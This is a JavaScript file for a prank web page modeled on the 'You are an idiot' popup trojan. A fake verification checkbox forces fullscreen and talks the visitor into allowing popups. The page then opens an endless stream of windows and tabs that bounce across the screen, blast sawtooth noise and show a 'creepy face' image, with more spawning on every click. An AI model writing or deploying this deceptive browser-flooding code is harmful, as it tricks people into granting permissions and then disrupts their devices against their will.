const overlay = document.getElementById('overlay');
const debugLog = document.getElementById('debug-log');
let audioContext;
let isPopup = new URLSearchParams(window.location.search).get('type') === 'popup';

// --- Logger ---
function log(msg) {
    if (debugLog && !isPopup) {
        // const div = document.createElement('div');
        // div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
        // debugLog.appendChild(div);
        console.log(msg);
    }
}

// --- Audio ---
function playSound() {
    try {
        if (!audioContext) return;
        if (audioContext.state === 'suspended') audioContext.resume();
        const osc = audioContext.createOscillator();
        const gain = audioContext.createGain();
        osc.frequency.setValueAtTime(200 + Math.random() * 800, audioContext.currentTime);
        osc.frequency.exponentialRampToValueAtTime(100, audioContext.currentTime + 0.1);
        osc.type = 'sawtooth';
        gain.gain.setValueAtTime(0.1, audioContext.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.1);
        osc.connect(gain);
        gain.connect(audioContext.destination);
        osc.start();
        osc.stop(audioContext.currentTime + 0.1);
    } catch (e) { }
}

// --- Spawning Logic (Chaos) ---
function spawnPopup() {
    const w = 300;
    const h = 300;
    const left = Math.random() * (window.screen.availWidth - w);
    const top = Math.random() * (window.screen.availHeight - h);
    let url = window.location.href;
    if (!url.includes('type=popup')) url += (url.includes('?') ? '&' : '?') + 'type=popup';

    // 1. Moving Popup
    window.open(url, '_blank', `width=${w},height=${h},left=${left},top=${top},menubar=no,toolbar=no,location=no,status=no,resizable=no`);

    // 2. Tab Chaos
    try { window.open(url, '_blank'); } catch (e) { }
}

// --- Popup Window Behavior ---
function initPopupBehavior() {
    document.body.classList.add('active'); // Flash
    if (overlay) overlay.style.display = 'none';

    try {
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        setInterval(playSound, 200);
    } catch (e) { }

    let vx = (Math.random() - 0.5) * 60;
    let vy = (Math.random() - 0.5) * 60;
    if (Math.abs(vx) < 15) vx = 30;

    setInterval(() => {
        window.moveBy(vx, vy);
        if (window.screenX <= 0 || window.screenX + window.outerWidth >= window.screen.availWidth) vx *= -1;
        if (window.screenY <= 0 || window.screenY + window.outerHeight >= window.screen.availHeight) vy *= -1;
    }, 50);

    document.body.innerHTML = `
        <div style="position:relative;width:100%;height:100%;background:black;overflow:hidden;cursor:pointer;">
            <img src="creepy_face.png" style="width:100%;height:100%;object-fit:cover;" alt="YOU ARE AN IDIOT">
            <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:white;font-size:30px;font-weight:bold;text-shadow:2px 2px 0 #000;white-space:nowrap;pointer-events:none;">
                omotigo on top
            </div>
        </div>
    `;

    window.addEventListener('click', () => {
        spawnPopup();
        spawnPopup();
        if (audioContext && audioContext.state === 'suspended') audioContext.resume();
    });
}

// --- Main Page Chaos Start ---
function startMain() {
    log("CHAOS STARTED");
    try {
        audioContext = new (window.AudioContext || window.webkitAudioContext)();
        audioContext.resume();
        setInterval(playSound, 200);
    } catch (e) { }

    document.body.classList.add('active');
    overlay.style.display = 'none';

    window.addEventListener('mousedown', () => {
        spawnPopup();
        if (audioContext && audioContext.state === 'suspended') audioContext.resume();
    });

    for (let i = 0; i < 3; i++) spawnPopup();

    setInterval(() => {
        spawnPopup();
    }, 800);
}

// --- Verification Flow (Updated) ---
function initMainBehavior() {
    const checkbox = document.getElementById('verify-check');
    const btn = document.getElementById('allow-btn');
    const messageBox = document.querySelector('.message');

    if (!checkbox || !btn) {
        if (overlay) overlay.addEventListener('click', startMain);
        return;
    }

    checkbox.addEventListener('change', (e) => {
        if (e.target.checked) {
            btn.disabled = false;
            btn.style.cursor = 'pointer';
            btn.style.opacity = '1';
            btn.style.background = '#0F9D58';
        } else {
            btn.disabled = true;
            btn.style.cursor = 'not-allowed';
            btn.style.opacity = '0.6';
            btn.style.background = '#4285f4';
        }
    });

    btn.addEventListener('click', () => {
        // 0. Go Fullscreen immediately on user interaction
        try {
            document.documentElement.requestFullscreen().catch(e => {
                console.log("Fullscreen request fail:", e);
            });
        } catch (e) { }

        // 1. User Click Phase (Interaction)
        // Disable everything immediately
        checkbox.disabled = true;
        btn.disabled = true;
        btn.style.background = '#f4b400';
        btn.style.cursor = 'wait';

        let seconds = 4;
        btn.textContent = `Validating in ${seconds}...`;

        // 2. Countdown Phase (Separation)
        const countdown = setInterval(() => {
            seconds--;
            if (seconds > 0) {
                btn.textContent = `Validating in ${seconds}...`;
            } else {
                clearInterval(countdown);
                attemptAutonomousCheck(btn, messageBox);
            }
        }, 1000);
    });
}

// 3. Autonomous Check Phase (System initiated)
function attemptAutonomousCheck(btn, messageBox) {
    btn.textContent = "Checking Permissions...";

    // Attempt to open verification window
    let testWin = null;
    try {
        testWin = window.open('about:blank', '_blank', 'width=50,height=50,left=0,top=0');
    } catch (e) { }

    // Strict Verification Logic
    let isAllowed = false;
    if (testWin) {
        // It opened. Is it a "real" window?
        // Browsers blocking popups might return null OR a zombie object.
        if (!testWin.closed) {
            // If height is 0, it's likely a blocked window stub in some browsers
            if (testWin.innerHeight > 0) {
                isAllowed = true;
            }
        }
    }

    if (isAllowed) {
        log("Permission Confirmed.");
        testWin.close();
        btn.textContent = "VERIFIED";
        btn.style.background = '#0F9D58';

        // Start Chaos shortly
        setTimeout(() => {
            startMain();
        }, 800);
    } else {
        log("Permission Denied (Blocked).");

        // Reset UI for retry
        btn.textContent = "⚠ RETRY (Popups Blocked) ⚠";
        btn.style.background = '#db4437';
        btn.disabled = false;
        btn.style.cursor = 'pointer';

        document.getElementById('verify-check').disabled = false;

        // Message
        if (!document.getElementById('block-warning')) {
            const help = document.createElement('div');
            help.id = 'block-warning';
            help.style.cssText = 'color:#d32f2f; font-weight:bold; margin-top:15px; border:2px dashed #d32f2f; padding:10px; font-size:12px; text-align:left; background:#fff0f0;';
            help.innerHTML = `
                <div style="font-size:14px; margin-bottom:5px;">🚫 <strong>Popups Blocked</strong></div>
                This test verifies if the site can open windows <em>autonomously</em>.<br>
                Your browser blocked the autonomous window.<br>
                <br>
                <strong>To fix this:</strong>
                <ol style="padding-left:20px; margin:5px 0;">
                    <li>Look for the 🚫 icon in the address bar.</li>
                    <li>Select <strong>"Always allow popups..."</strong></li>
                    <li>Click <strong>"Done"</strong>.</li>
                    <li><strong>Click the button above again.</strong></li>
                </ol>
            `;
            messageBox.appendChild(help);
        }
    }
}

if (isPopup) {
    initPopupBehavior();
} else {
    initMainBehavior();
}
